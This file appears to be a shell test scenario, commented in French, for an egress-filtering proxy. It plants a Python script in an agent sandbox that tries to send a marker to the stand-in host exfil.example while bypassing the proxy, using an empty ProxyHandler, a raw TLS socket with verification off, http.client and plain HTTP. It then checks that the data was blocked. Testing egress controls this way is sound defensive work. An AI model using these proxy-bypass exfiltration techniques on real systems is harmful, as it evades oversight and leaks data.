#!/usr/bin/env bash
# 04 — Contournement par script (cahier §8) : un script Python ouvre la connexion lui-même en ignorant le
# proxy (ProxyHandler vide, socket brut + TLS, http.client). L'interception transparente doit refuser.
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 04-contournement-script "Script Python qui ignore le proxy"
require_demo laurent-bot
positive_control laurent-bot
m="s04-$(rand_hex)"
agent_sh laurent-bot "cat > /tmp/s04.py" <<PY
import http.client, socket, ssl, sys, urllib.request
results = []
def run(name, fn):
    try:
        fn(); results.append(f"{name}: SENT")
    except Exception as e:  # noqa: BLE001
        results.append(f"{name}: {type(e).__name__}: {e}"[:160])
opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
run("urllib-noproxy", lambda: opener.open("https://exfil.example/u", data=b"$m", timeout=8))
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
def raw_tls():
    s = socket.create_connection(("exfil.example", 443), timeout=8)
    t = ctx.wrap_socket(s, server_hostname="exfil.example")
    t.sendall(b"POST /r HTTP/1.1\r\nHost: exfil.example\r\nContent-Length: ${#m}\r\n\r\n$m"); t.recv(100)
run("raw-socket-tls", raw_tls)
def httpclient():
    c = http.client.HTTPSConnection("exfil.example", timeout=8, context=ctx); c.request("POST", "/h", body=b"$m"); c.getresponse()
run("http.client", httpclient)
def plain_http():
    c = http.client.HTTPConnection("exfil.example", 80, timeout=8); c.request("POST", "/p", body=b"$m"); c.getresponse()
run("plain-http", plain_http)
print("\n".join(results))
PY
out="$(agent_sh laurent-bot 'env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy python3 /tmp/s04.py' 2>&1 || true)"
while IFS= read -r l; do [ -n "$l" ] && evidence "$l"; done <<<"$out"
assert_not_received exfil "$m" "the script"
pass "le script qui ignore le proxy n'a rien fait sortir"
